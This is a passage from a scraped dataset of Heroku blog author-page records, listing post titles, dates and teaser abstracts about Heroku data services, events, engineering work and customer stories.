industries like Health & Life Sciences and Financial Services, we are thrilled to announce that Heroku Private Spaces and Shield customers can now deploy a new Postgres, Redis, or Apache Kafka service with a key created and managed in their private AWS KMS account. With BYOK, enterprises gain full data custody and data access control without taking on the burden of managing any aspect of the data service itself. This... Read more PostgreSQL 12 Generally Available on Heroku news February 04, 2020 Scott Truitt After a successful evaluation period, PostgreSQL 12 is now the default version for new Heroku Postgres databases and an available upgrade for existing databases. I want to emphasize a few key changes and improvements in Postgres 12: Native Table Partitioning Concurrent Operations Native Partitioning was introduced in PostgreSQL 10 and performance improvements for improved parallel processing were added in PostgreSQL 11. Updating tables, altering partitions blocking queries, and executing concurrent operations for Native Partitioning were all improved in PostgreSQL 12. New features include allowing tables to modify partitions without blocking queries, allowing foreign keys to reference... Read more Announcing Heroku Data Services Integrations Using mutual TLS and PrivateLink news November 07, 2019 Scott Truitt Today, we’re thrilled to announce four new trusted data integrations that allow data to flow seamlessly and securely between Heroku and external resources in public clouds and private data centers: Heroku Postgres via mutual TLS Heroku Postgres via PrivateLink Apache Kafka on Heroku via PrivateLink Heroku Redis via PrivateLink These integrations expand Heroku's security and trust boundary to cover the connections to external resources and the data that passes through them. They enable true multi-cloud app and data architectures and keep developers focused on delivering value versus managing infrastructure. Data is the driving force in modern app development, and these... Read more Apache Kafka on Heroku Shield is Now Generally Available news October 01, 2019 Scott Truitt We are thrilled to announce that Apache Kafka on Heroku Shield is now generally available and certified for handling PHI, PII, and HIPAA-compliant data. Our newest managed data service unifies Heroku Shield, a set of Heroku platform services that offer additional security features needed for building high compliance applications, with Apache Kafka on Heroku, our fully-managed service based on the leading open-source solution for handling event streams. Organizations of all sizes face relentless pressure to bring better apps and experiences to market, and those with a strong focus on data security like Health and Life Sciences (HLS) organizations need to balance safety and agility. Their... Read more Why Frequent Maintenances Are Essential for Secure Heroku Data Services news July 23, 2019 Scott Truitt There are many reasons to choose Heroku Data services, but keeping the services you use secure and up-to-date rank near the top. This foundation of trust is the most important commitment we make to our customers, and frequent and timely maintenances are one way we deliver on this promise. We do everything we can to minimize downtime, which is typically between 10 – 60 seconds per maintenance. There are ways for you to minimize disruption too (see the tips and tricks below). The rest of the post explains how we think about Heroku Data maintenances, how we perform them, and when we perform them. An Ounce of Prevention... Hackers exploit known but unpatched vulnerabilities or out-of-date... Read more Heroku Postgres via PrivateLink Is Now Generally Available news May 22, 2019 Scott Truitt Today, we're thrilled to announce Heroku Postgres via PrivateLink, a new integration that enables customers to seamlessly and securely connect Heroku Postgres databases in Private Spaces to resources in one or more Amazon VPCs. Heroku Postgres via PrivateLink connections are secure and stable by default because traffic to and from Heroku Postgres stays on the Amazon private network; once a PrivateLink is set up, there is no brittle networking configuration to manage. As always, security and trust are top of mind with everything we do at Heroku. The ability to configure Heroku Postgres via PrivateLink is already enabled on all private Postgres plans. It's also included at no... Read more An Update on Redis Vulnerabilities and Patching news June 13, 2018 Scott Truitt On May 10, 2018, we received notice about two critical vulnerabilities in Redis, both embargoed until this morning . Upon this notice, our Data Infrastructure team proceeded to patch all internal and customer databases in response to these vulnerabilities. As of today, all customer databases have been patched successfully. At Heroku, customer trust is our most important value - and we are grateful to have your trust in keeping a globally-distributed data fleet safe from harm. If you’re interested in more behind the scenes details, check out our engineering blog post on how our Data Infrastructure team undertook the effort to patch our entire Redis fleet . Read more", "date": "2020-10-08,"},
{"website": "Heroku", "title": null, "author": ["Scott Persinger", "Scott Persinger", "Scott Persinger", "Scott Persinger", "Scott Persinger"], "link": "https://blog.heroku.com/authors/scott-persinger", "abstract": "Powering the Heroku Platform API: A Distributed Systems Approach Using Streams and Apache Kafka news July 19, 2016 Scott Persinger We recently launched Apache Kafka on Heroku into beta. Just like we do with Heroku Postgres, our internal engineering teams have been using our Kafka service to power a number of our internal systems. The Big Idea The Heroku platform comprises a large number of independent services. Traditionally we’ve used HTTP calls to communicate between these services. While this approach is simple to implement and easy to reason about, it has a number of drawbacks. Synchronous calls mean that the top-level request time will be gated by the slowest backend component. Also, internal API calls create tight point-to-point couplings between services that can become very brittle over time. Asynchronous... Read more Getting started with the Force.com APIs for the Hackathon engineering October 06, 2014 Scott Persinger With the Salesforce hackathon fast approaching, I wanted to give a quick overview on building apps that use the force.com APIs (part of the Salesforce1 platform). The force APIs are rich and varied, so sometimes just getting started can seem a little daunting. Read more The Heroku Mobile App Template engineering October 01, 2014 Scott Persinger One of the challenges when starting a mobile app project is deciding what technology stack to use. Should the client app use iOS or Android native, mobile web, or a hybrid? Do the backend in Node, Ruby, or Java? Or skip the backend and use an Mobile Backend-as-a-Service? To help avoid needing to answer all those on your own we are open sourcing the Heroku Mobile Template . This app provides a full-stack starting point for creating new hybrid mobile apps and deploying them to Heroku. Read more Event-driven Data Sync engineering July 16, 2014 Scott Persinger Heroku Connect is a service offered by Heroku which performs 2-way data synchronization between force.com and a Heroku Postgres database. When we first built Heroku Connect, we decided to use polling to determine when data had changed on either side. Polling isn't pretty, but its simple and reliable, and those are \"top line\" features for Heroku Connect. But polling incurs two significant costs: high latency and wasted resources. The more you poll the more you waste API calls and database queries checking when there are no data changes. But if you lengthen your polling interval then you grow the latency for the data synchronization. Read more Using force.com from your Heroku apps engineering July 07, 2014 Scott Persinger Force.com and Heroku are both part of the Salesforce1 platform. There are lots of great ways to leverage force.com from your Heroku app. This article will give an overview and pointers to get you started. Read more", "date": "2016-07-19,"},
{"website": "Heroku", "title": null, "author": ["Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife", "Sara Dornsife"], "link": "https://blog.heroku.com/authors/sara-dornsife", "abstract": "Congratulations to Plated, Zoobean, and Breathometer on Shark Tank news April 10, 2014 Sara Dornsife We love seeing our customers’ successful and gaining recognition for the amazing businesses they are building. So, as you could imagine, we were thrilled to learn that a Heroku customer was featured on ABCs Shark Tank last Friday, with two more being featured over the next couple weeks. Plated - Aired 4/4 at 9pm ET on ABC Plated , a New York City-based food/tech company, aims to make it simple and fun for people to create healthy, homemade dinners by delivering fresh ingredients and chef-designed easy-to-follow recipes directly to your door. With delivery now available to 80% of the USA, Plated is likely available to you. After Plated’s launch in November 2012, the company was featured... Read more PyCon Montreal  - April 9 - 17, 2014 news April 09, 2014 Sara Dornsife We are really honored to be a part of PyCon again this year. We have a big booth in the expo hall and a bunch of people who are really looking forward to attending and who are there to answer questions, hack on code, troubleshoot, or shoot the …. Enter to win: While you are in our booth, you can enter to win $500 (in cash or credits) toward the open source-related project, user group, meetup, or organization of your choice. Ask at the booth for details. Here’s who is going to be there this weekend: Craig Kerstiens ( @craigkerstiens ) Dave Gouldin @dgouldin ) Dominic Dagradi @dddagradi ) Francis Lacoste ( @fjlacoste ) Greg Stark ( @zkzkz ) Jacob Kaplan-Moss ( @jacobian ) Jamu Kakar ( @jkarak ) ... Read more Heroku at the AWS Summit SF - Wed March 26th news March 24, 2014 Sara Dornsife AWS Summit SF is coming up on Wed March 26th at Moscone South. We are thrilled to be sponsoring the Developer Lounge. Heroku engineers and staff will be available throughout the day to answer your questions about Heroku; developing Ruby, Python, and Node apps on Heroku; Heroku Postgres; and the architecture of apps using both Heroku and AWS. If you plan on attending, please stop by, say hello, and bring your questions. Or you can just play ping pong. If you would like to set up an appointment for a specific time, please send us an email . Read more SxSW Starts Today! news March 07, 2014 Sara Dornsife SxSW Interactive starts today. The crowds have arrived, the sessions have begun, and the ExactTarget Orange Oasis is open. Please stop by and say hello at the Heroku purple pavilion there, or schedule a private meeting or demo . Check out the SXSW Fitbit Leaderboard from ExactTarget while you are here. This Heroku app logs and tracks your steps at SxSW. You can join the Leaderboard by logging into Fitbit, and sending a mail to fitbit@exacttarget.com . Also join us for the Heroku SxSW meetup on Sun from 5 - 8p. We'll have food, a haiku poetry slam, and drinks. Have a great (and safe) SxSW, and hope to see you there. The Heroku Team Read more Join us at SxSW Interactive news February 27, 2014 Sara Dornsife Every year tens of thousands of people descend on Austin, TX for SxSW Interactive to learn about the latest in digital technologies. This year Heroku is descending as well and we want to see you there. Orange Oasis Fri., March 7th and Sat., March 8th Brass House - 115 San Jacinto Blvd (@ 2nd St) Heroku will be a part of ExactTarget’s Orange Oasis at Brass House. Close to the convention center, but out of the noise and crowds of SxSW, we’ll have a Purple Pavilion inside the Orange Oasis. Please stop by and say hello, or schedule a private meeting or demo with one of sales or technical reps. Hours: Friday, March 7th 1p - 4p Meetings and product demos 4p - 6p Join us for Happy Hour ... Read more Why Heroku Adopted a Code of Conduct Policy and Sponsored The Ada Initiative news December 10, 2013 Sara Dornsife Editor's note: This is a guest post from Rikki Endsley . Rikki Endsley is a technology journalist and the USENIX Association's community manager. In the past, she worked as the associate publisher of Linux Pro Magazine, ADMIN, and Ubuntu User, and as the managing editor of Sys Admin magazine. Find her online at rikkiendsley.com and @rikkiends on Twitter. A code of conduct is a signal to attendees that conference organizers have carefully considered the issues involved with attending events, and that they want to make their conference welcoming and safe for everyone. Heroku recently adopted an event sponsorship policy that shows that the company recognizes the importance of formal... Read more Message Queues, Background Processing and the End of the Monolithic App news December 03, 2013 Sara Dornsife Editor's note: This is a guest post from Ken Fromm and Paddy Foran at Iron.io . Iron.io's services are designed for building distributed cloud applications quickly and operating at scale. Platform as a Service has transformed the use of cloud infrastructure and drastically increased cloud adoption for common types of applications, but apps are becoming more complex. There are more interfaces, greater expectations on response times, increasing connections to other systems, and lots more processing around each event. The next shift in cloud development will be less about building monolithic apps and more about creating highly scalable and adaptive systems. Don’t get us wrong,... Read more Heroku at Dreamforce - Nov 18 - 21 news November 15, 2013 Sara Dornsife It’s hard to believe the scale or imagine the energy that is Dreamforce . As part of the Salesforce Platform, a platform with a growing developer community and an amazing range of technologies, Heroku will join the party November 18-21 in San Francisco. This is a big deal for us. DevZone A few weeks ago we announced the Salesforce $1 Million Hackathon . By the way, that’s $1 million cash, the single largest hackathon prize in history. The response from our developer community has been fantastic – the winning app will be undoubtedly amazing. Heroku will also be a big part of developer workshops, the genius bar, several demo stations and a whole list of sessions. Extra bonus, the DevZone... Read more Interview with Heroku's Mattt Thompson: The Incredibly True Story of Why an iOS Developer Dropped His CS Classes and Eventually Learned How to Fly news November 12, 2013 Sara Dornsife Editor's note: This is a guest post from Rikki Endsley . In this exclusive interview, iOS developer Mattt Thompson opens up about the moment when he realized he'd become a programmer, why he dropped his computer science classes, and what he does AFK. Had Mattt Thompson followed in his parents' footsteps, he'd be a musician now instead of a well-known iOS developer working as the Mobile Lead at Heroku . Matthew “Mattt” Thomas Thompson was born and raised in the suburbs of Pittsburgh, Pennsylvania, by parents who are both musicians, play in the symphony, and teach music. Whereas his sister took to music growing up, Mattt kept going back to his computer. He says he couldn't... Read more $1 Million Hack - $99 pass FREE for a limited time news November 06, 2013 Sara Dornsife As we previously announced , salesforce.com is hosting a $1 Million Hackathon for the most awesome mobile app built using Salesforce Platform, which includes Heroku. It's taking place now and culminates at Dreamforce in San Francisco. For a limited time we are making it FREE ($99 value) to participate in the Salesforce $1 Million Hackathon. Sign up for the Hacker Pass and you will get access to the Hackathon plus all the great content and activities in the Developer Zone at Dreamforce. Additionally, the first 500 people to use the promo code HEROKU when registering will receive a $200 Heroku credit on-site at the Hackathon. Get your FREE Hacker Pass and $200 credit when you register... Read more Compete to win the Salesforce $1 Million Hackathon news October 25, 2013 Sara Dornsife How would you like to win $1 million in a hackathon? Seriously. As you know, Heroku is part of the Salesforce Platform. A platform with a growing developer community and broad range of technologies that developers have used to create amazing solutions. So at Salesforce, we thought we’d cook up a little surprise. OK, a huge surprise: the world’s first hackathon with a single $1 million prize. It’s on. Come to Dreamforce . Build a next generation mobile app. And win a million bucks. Really. What better way to say thank you to our developers than to put on the biggest onsite hackathon in history. Today, we are thrilled to launch the Salesforce $1 Million Hackathon ! Here's how to get... Read more How SpaceGlasses Builds the Future with Heroku news September 19, 2013 Sara Dornsife Editor's note: This is a guest post from Michael Buckbee of Meta/SpaceGlasses. SpaceGlasses are augmented reality glasses that actually work. They let people control systems with a gesture, see virtual objects on top of the real world and create technology that would make Tony Stark proud. Prior to joining Meta, I had developed and managed a number of high traffic Rails sites. I was brought on to help move the company’s website from a single static launch page to being an e-commerce platform and to help lay the groundwork for the company’s app store. We chose to build on top of Heroku as we are moving very quickly, need to have a lots of flexibility and don’t have the time or budget... Read more Heroku Platform API Hack-a-thon June 20th in SF news June 11, 2013 Sara Dornsife The new Heroku platform API is out in public beta . Come join our API team for an API Hack-a-thon on June 20th at Heavybit Industries (9th and Folsom) for an in-depth look. Doors open at 6:00p. This hack-a-thon is not a competition, but an in-depth look at the beta release - a chance for you to ask questions and provide feedback to the Heroku API team. Heroku’s API lead, Wesley Beary , will start the evening with a live presentation on the design and possibilities of the platform API. We will then have until 10:00p to talk to Wesley and the rest of the API team to ask questions and hack on code as well as enjoy a little food and drink. Space is limited, so register today. Read more London Fork-a-thon news May 06, 2013 Sara Dornsife On 15 May, join Heroku for the London Fork-a-thon, a hack-a-thon-like event (hands-on and live coding), where Heroku engineers will be available to answer any questions you might have regarding Heroku in Europe, and to help you to fork your app to the Europe region. Space is limited, register now . Heroku just announced the release of the Heroku Europe region in public beta. The Europe region runs apps from datacenters located in Europe and offers increased performance for customers located in that region. We're calling this a \"fork-a-thon\" because fork is the fastest way to move your app to the Europe region. Heroku fork allows you to copy an existing application, including... Read more What’s Happening at Waza news February 20, 2013 Sara Dornsife Waza (技) 2013 is only a week away and the schedule is packed with amazing speakers and hands-on craft experiences. We can’t wait to share this day with all of you. If you haven’t yet, register now before it’s too late! This year, Waza will have three stages with a total of 20 talks. The rest of the venue is packed with lounges, co-working spaces, snack and beverage stations, and, thanks to our sponsors, all kinds of interactive, craft-based activities to fuel your creative mind. ##Hands-on Crafts In addition to our great sponsored happenings, we have quilting, dye-making and printmaking artists on hand. Come experience their unique crafts, hands-on and up-close. Quilting and Dye-making :... Read more Waza 2013 - Keynote Speakers news January 29, 2013 Sara Dornsife Waza (技) 2013 is less than a month away and we are excited to have a full lineup of speakers who will be talking about their perspectives on art and technique. In between the talks, take part in an unique blend of conversation and craft through the hands-on workshops led by artisans teaching their trades from origami creations, to take-home woodblock prints, and even a hand-crafted and dyed quilt. Take part in this celebration of skill and making at Waza 2013 . Waza Keynotes: Michael Lopp: Rands in Repose Michael has been blogging since 2002 as his alter-ego Rands in Repose . Our favorite recent quote: \"Engineers don’t hate process. They hate process that can’t defend... Read more Registration for Waza 2013 is now open news January 11, 2013 Sara Dornsife The Concourse - San Francisco February 28, 2013 Heroku’s Waza (技) , the Japanese word for art and technique, is an immersive one-day developer experience focused on craft. Throughout the event you will find technical sessions with added experiences in music, art and technology. The event features technical sessions, hands-on workshops, great food, and traditional music. Registration is now open! Tickets are $300. Last year’s event sold out in a matter of hours. Don’t risk missing out this year -- join us for Waza on February 28th, 2013 at the Concourse in San Francisco. We are excited to announce the following speakers: Aaron Patterson Austin Bales Jack Lawson Jacob Kaplan-Moss Jason... Read more Announcing Heroku Enterprise for Java news September 19, 2012 Sara Dornsife A year ago we we launched Java support with the ability to deploy Maven based Java applications using Heroku’s familiar git based workflow. Many customers, like Banjo , have since taken advantage of the new capabilities and built a wide variety of Java applications on the platform. With the introduction of Java support, we are seeing growing interest from larger enterprises who are often heavy Java users and who are looking for a platform like Heroku to increase the speed of application delivery. Today, we are announcing Heroku Enterprise for Java, a new product that makes it simpler than ever for enterprise developers to create, deploy and manage Java web applications using their... Read more", "date": "2014-04-10,"},
{"website": "Heroku", "title": null, "author": ["Email", "Sally Vedros", "Sally Vedros", "Sally Vedros", "Sally Vedros", "Sally Vedros", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura", "Sally Vedros", "Sally Vedros", "Sally Vedros"], "link": "https://blog.heroku.com/authors/sally-vedros", "abstract": "How a Shark Tank Pitch Led Zoobean’s Founders in an Unexpected Direction life April 14, 2021 Sally Vedros Every entrepreneur wonders: “Will my startup sink or swim?” When Felix Brandon and his wife Jordan Lloyd Bookey launched Zoobean , a startup focused on children’s reading, they found themselves swimming in rough waters early on. A few months after launch, the founders were invited to pitch their business on the TV show Shark Tank. What felt like a sinking moment turned into more than a lifeline for the fledgling business — it entirely transformed their business model. In the year that followed the Shark Tank episode, Zoobean went from a consumer subscription service to an enterprise reading program platform loved by millions of readers of all ages. From the mouths of babes to the... Read more Coding at the Speed of a Pandemic: How Trineo Delivered Apps That Test the Test Kits life December 08, 2020 Sally Vedros The need for speed takes on a new meaning in the face of a pandemic. With millions of lives at stake, everyone in the healthcare ecosystem, from medical facilities to laboratories to equipment manufacturers, races to do their part to help curb the spread. With the coronavirus, the world put widespread diagnostic testing at the core of its pandemic response playbook. However, testing is only effective if the test results are accurate — a false negative could not only endanger the individual, but also their entire community. Third-party quality assurance providers play a vital role in testing the tests. They make sure that test equipment and processes adhere to the highest standards. One... Read more When Serendipity Strikes: How One Engineer Turned His First Coding Gig into a Decade-Plus Career life December 03, 2020 Sally Vedros For many of us, changing jobs seems like the best way to grow professionally or advance our careers. Not so for Edd Morgan , Senior Director of Engineering at BiggerPockets . During his first year in college, he became the startup’s first employee. Twelve years later, Edd reflects on his unusually stable career path and how he’s helped to grow the company into a thriving business with two million users. It all started with a part-time job In 2008, Edd began studying computer science at the University of Bournemouth in the U.K. Like many college students, he needed to find a way to make money for rent and living expenses. Edd came across a job posting from a startup that needed some... Read more How to Transform a Heavy Industry, One Sensor at a Time life September 14, 2020 Sally Vedros Moving shipping containers is heavy work. Moving a traditional industry into the digital age is a different kind of heavy job. Software development agency GNAR took on the challenge and built an ops management platform for RMS Intermodal , one of the largest rail yard operators in the U.S. Their IoT solution gave RMS a data-driven view of their operations for the first time, resulting in a whole new definition of “efficiency” for the company. Serendipity manifests a new idea It all started at a wedding. GNAR Founder Brandon Stewart found himself chatting with Adam Gray , the son of RMS Intermodal’s President, and the conversation turned to RFID tracking. Brandon had done some work on an... Read more How a Live Tutoring Platform Helps the Working World Get Ahead life July 21, 2020 Sally Vedros In today's global economy, English proficiency unlocks opportunity. People all over the world are motivated to improve their English skills in order to make a better life for themselves and their families. Cambly is a language education platform that helps millions of learners advance their careers by connecting them with English-speaking tutors from a similar professional background. For many language learners, speaking is often the hardest skill to improve in a classroom setting. Conversation time is limited, and students tend to practice with each other rather than with a teacher. Some students may not have a fluent speaker available in their location. Cambly offers one-on-one... Read more Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more 161 Lives Saved (and Counting): Team Heroku Steps Up to Help Feed Malnourished Kids life June 10, 2020 Sally Vedros Yesterday, I took my rusty old bike out of the basement and rode through Golden Gate Park to Ocean Beach and back. The 6+ mile ride may seem short to some, but for me, it was something I never thought I’d be doing just a short time ago. I’m on a roll (literally!) that started at the beginning of May when I joined the “Active Together While Apart” activity challenge. As I wrote about in my earlier blog post , Heroku customer Active for Good is working to fight severe acute malnutrition in children around the world with a unique program here in North America. The organization runs activity challenges that inspire people to get more exercise, and simply by doing so, contribute to their... Read more A True Win-Win: How Being More Active Can Help Fight Malnutrition life April 30, 2020 Sally Vedros The other day, I was sitting at my work desk feeling too sedentary, too isolated, and altogether too down about my restricted life during this coronavirus pandemic. Then, an email popped into my inbox from one of my favorite Heroku customers. Active for Good was announcing their latest activity challenge starting on May 1st . Every minute of exercise during the month of May counts towards unlocking lifesaving meals for malnourished kids. If there was ever a reason to get my sorry butt up out of my chair, this was it! Food as prescribed medicine To start with, Active for Good is easy to love. It’s a sister organization of MANA Nutrition , a nonprofit that manufactures ready-to-use... Read more Finding Inspiration in Apps on Earth Day life April 22, 2019 Sally Vedros Earth Day inspires millions of people around the world to take action on behalf of our beautiful planet. For some, this means getting out and volunteering for a day with an environmental group. For others, it’s about changing our daily habits to be more mindful about things like recycling, driving, or water usage. But a growing sector is taking earth-friendly action at scale. From nonprofits to NGOs to green businesses, visionary entrepreneurs are using modern technology to address Planet Earth’s very modern problems. I often work with Heroku customers to help them share their story with the world. Along the way, I find myself constantly inspired by so many innovative apps that change... Read more", "date": "2021-04-14,"},
{"website": "Heroku", "title": null, "author": ["Ryan Townsend", "SHIFT Commerce", "Email", "Twitter", "Facebook", "GitHub", "LinkedIn", "Ryan Townsend", "Ryan Townsend"], "link": "https://blog.heroku.com/authors/ryan-townsend", "abstract": "A Pandemic Tale: How a Simple Algorithm Brought a Business Back from Lockdown life October 20, 2020 Ryan Townsend Sometimes, innovation is born in the midst of a crisis. Unexpected challenges and a sense of urgency force companies to look for new ways of keeping the business going, even as the odds stack up against them. This was the case for one of our biggest customers Matalan , a major fashion and homeware retailer in the U.K. The company operates 230 brick and mortar stores across the country, and 30 international franchise stores within Europe and the Middle East. It also maintains a thriving online channel that runs on the SHIFT platform . Read more SHIFT Commerce's Journey: Deconstructing Monolithic Applications into Services engineering March 13, 2018 Ryan Townsend Editor’s Note: One of the joys of building Heroku is hearing about the exciting applications our customers are crafting. SHIFT Commerce - a platform helping retailers optimize their e-commerce strategy - is a proud and active user of Heroku in building its technology stack. Today, we’re clearing the stage for Ryan Townsend, CTO of SHIFT , as he provides an overview of SHIFT’s journey into building microservices architecture with the support of Apache Kafka on Heroku. Software architecture has been a continual debate since software first came into existence. The latest iteration of this long-running discussion is between monoliths and microservices – large self-contained applications vs... Read more", "date": "2020-10-20,"},
{"website": "Heroku", "title": null, "author": ["Ryan Daigle"], "link": "https://blog.heroku.com/authors/ryan-daigle", "abstract": "Building Twelve Factor Apps on Heroku news August 15, 2013 Ryan Daigle At Heroku, we’ve had the privilege of running and managing millions of amazing apps built by our users. Over a year ago, Heroku co-founder Adam Wiggins published the Twelve Factor App , based directly on these experiences. It distills best practices for building modern cloud applications into a 12-factor methodology specifically designed to maximize developer productivity and application maintainability. Twelve Factor apps are built for agility and rapid deployment, enabling continuous delivery and reducing the time and cost for new developers to join a project. At the same time, they are architected to exploit the principles of modern cloud platforms while permitting maximum portability... Read more", "date": "2013-08-15,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Ryan Brainard"], "link": "https://blog.heroku.com/authors/ryan-brainard", "abstract": "Introducing React Refetch engineering December 15, 2015 Ryan Brainard Heroku has years of experience operating our world-class platform, and we have developed many internal tools to operate it along the way; however, with the introduction of Heroku Private Spaces , much of the infrastructure was built from the ground up and we needed new tools to operate this new platform. At the center of this, we built a new operations console to give ourselves a bird's eye view of the entire system, be able to drill down into issues in a particular space, and everything in between. The operations console is a single-page React application with a reverse proxy on the backend to securely access data from a variety of sources. The console itself started off from a mashup... Read more", "date": "2015-12-15,"},
{"website": "Heroku", "title": null, "author": ["Email", "LinkedIn", "Robert Zare", "Robert Zare", "Robert Zare"], "link": "https://blog.heroku.com/authors/robert-zare", "abstract": "Announcing General Availability of Heroku Shield Connect news June 21, 2018 Robert Zare Today we are pleased to announce general availability of Heroku Shield Connect, the latest addition to our lineup of Heroku Shield services. Heroku Shield , announced last year, enabled new capabilities for Dynos, Postgres databases and Private Spaces that make Heroku suitable for high compliance environments such as those that fall under the Health Insurance Portability and Accountability Act (HIPAA) regulations. Heroku Shield Connect extends this offering by enabling high performance, fully automated, and bi-directional data synchronization between Salesforce and Heroku Postgres for companies that need to build HIPAA-compliant applications - all in a matter of a few clicks. With this... Read more Heroku Connect Update: Fast Writes, Global Deployment, and a Guided Management Experience news October 26, 2017 Robert Zare Today we are pleased to announce a significant update to Heroku Connect , one that is a culmination of two years of work to improve every aspect of the service. We’ve focused on three primary areas: improving write speed, geographically expanding the service, and intelligently guiding design and troubleshooting workflows. To that end, we’ve enabled bulk writes resulting in a 5x average increase in sync performance to Salesforce, deployed Connect in six global regions to be closer to customers’ databases, and built three guided management experiences that significantly increase user productivity. Collectively, these enhancements will enable Heroku Connect to continue to meet the ever... Read more Now GA: Read and Write Postgres Data from Salesforce with Heroku External Objects news November 15, 2016 Robert Zare Today we are announcing a significant enhancement to Heroku External Objects : write support. Salesforce users can now create, read, update, and delete records that physically reside in any Heroku Postgres database from within their Salesforce deployment. Increasingly, developers need to build applications with the sophistication and user experience of the consumer Internet, coupled with the seamless customer experience that comes from integration with Salesforce. Heroku External Objects enable a compelling set of integrations scenarios between Heroku and Salesforce deployments, allowing Postgres to be updated based on business processes or customer records in Salesforce. With Heroku... Read more", "date": "2018-06-21,"},
{"website": "Heroku", "title": null, "author": ["Email", "Roberta Carraro"], "link": "https://blog.heroku.com/authors/roberta-carraro", "abstract": "Redesigned Monthly Invoices news June 21, 2013 Roberta Carraro Earlier this month, we quietly rolled out a new design for our monthly invoices. It's a breath of fresh air compared to the previous iteration, and we thought it would be interesting to share what goes into a design like this. At Heroku, billing is complex. Dyno hours are calculated to the second. Add-ons are calculated based on each provider’s pricing plan, which can be monthly or by usage depending on the add-on. There are support expenses, credits, free dyno hours, and packages. This all has to be wrangled into a format that not only makes sense for the back-end systems that run calculations, but also for the human beings that use Heroku and need to understand what they’re paying... Read more", "date": "2013-06-21,"},
{"website": "Heroku", "title": null, "author": ["Robbie Th'ng"], "link": "https://blog.heroku.com/authors/robbie-th-ng", "abstract": "StatusPage Add-On in Public Beta news August 14, 2013 Robbie Th'ng Sharing your app’s status is critical for communicating and building trust with your users - whether it’s down for maintenance, experiencing problems with service providers, suffering from interruptions or performance problems, or up and running perfectly. Here at Heroku, we accomplish this with Heroku Status . But today, we’re introducing our first add-on that makes it easy to communicate app status with users of your app - StatusPage , now in public beta. StatusPage lets you build your own branded status page so you can share status information and public metrics about your app while also providing highly-available downtime communication. Enable the Heroku integration by setting a few... Read more", "date": "2013-08-14,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis", "Rimas Silkaitis"], "link": "https://blog.heroku.com/authors/rimas-silkaitis", "abstract": "Heroku Postgres Update: Configuration, Credentials, and CI news August 08, 2017 Rimas Silkaitis At the core of Heroku’s data services sits Postgres, and today, we are making it even easier to bend Heroku Postgres to the very unique needs of your application’s stack. With these new features, you can easily customize Postgres, making it more powerful and configurable, while retaining all the automation and management capabilities of Heroku Postgres you know and love. By changing Postgres settings, creating and working with database credentials, and providing tight integrations to Heroku and Heroku CI, you now have the ability to further tune your Postgres database to your team’s needs. Read more PostgreSQL 9.6 Now Generally Available on Heroku news December 01, 2016 Rimas Silkaitis PostgreSQL 9.6 is now generally available for Heroku Postgres . The main focus of this release is centered around performance. PostgreSQL 9.6 includes enhanced parallelism for key capabilities that sets the stage for significant performance improvements for a variety of analytic and transactional workloads. With 9.6, certain actions, like individual queries, can be split up into multiple parts and performed in parallel. This means that everything from running queries, creating indexes, and sorting have major improvements that should allow a number of different workloads to execute faster than they had in prior releases of PostgreSQL. With 9.6, the PostgreSQL community, along with Heroku’s... Read more Handling Very Large Tables in Postgres Using Partitioning engineering September 13, 2016 Rimas Silkaitis One of the interesting patterns that we’ve seen, as a result of managing one of the largest fleets of Postgres databases , is one or two tables growing at a rate that’s much larger and faster than the rest of the tables in the database. In terms of absolute numbers, a table that grows sufficiently large is on the order of hundreds of gigabytes to terabytes in size. Typically, the data in this table tracks events in an application or is analogous to an application log. Having a table of this size isn’t a problem in and of itself, but can lead to other issues; query performance can start to degrade and indexes can take much longer to update. Maintenance tasks, such as vacuum, can also become... Read more Postgres 9.5 General Availability news May 03, 2016 Rimas Silkaitis Starting today, Postgres 9.5 is now the new default version for all new Heroku Postgres databases. We’ve had hundreds of customers using early beta versions of 9.5 and the feedback has been positive. For many customers, the new UPSERT functionality was the last feature that prevented many of them from moving from other relational databases to Postgres. The engineering staff at Heroku and the Postgres community at large has spent years bringing UPSERT to fruition and the customer feedback is a testament to that hard work. If you want to try out the new version, getting it is as simple as provisioning a new database: $ heroku addons:create heroku-postgresql -a sushi More UPSERT UPSERT,... Read more Here's Postgres 9.5: Now Available on Heroku news January 07, 2016 Rimas Silkaitis Heroku has long been committed to making PostgreSQL one of the best relational databases in the world. We’re also committed to giving you the ability to try the latest release as soon as it’s available. Today, we’re pleased to announce the public beta of Postgres 9.5 on Heroku. PostgreSQL 9.5 brings a bevy of super exciting new features with the most prominent being the new UPSERT functionality. UPSERT gives you the expected behavior of an insert, or, if there is a conflict, an update, and is performant without the risk of race conditions for your data. UPSERT was one of the last few detracting arguments against PostgreSQL. A special thanks goes to Peter Geoghegan on the Heroku Postgres... Read more Heroku Redis GA and Introducing Heroku Data Links news June 25, 2015 Rimas Silkaitis Today we’re pleased to announce general availability of Heroku Redis with a number of new features and a more robust developer experience. By giving developers a different data management primitive, we’re helping them meet the needs of building modern, scalable applications. The classic example of using multiple data stores in an application is the e-commerce site that stores its valuable financial information in a relational database while the user session tokens are saved in a key-value store like Redis. This is one of the use cases where Redis has proven to be instrumental in solving problems like caching, queuing and session storage, just to name a few . In addition to making Heroku... Read more Heroku Redis Now Available in Public 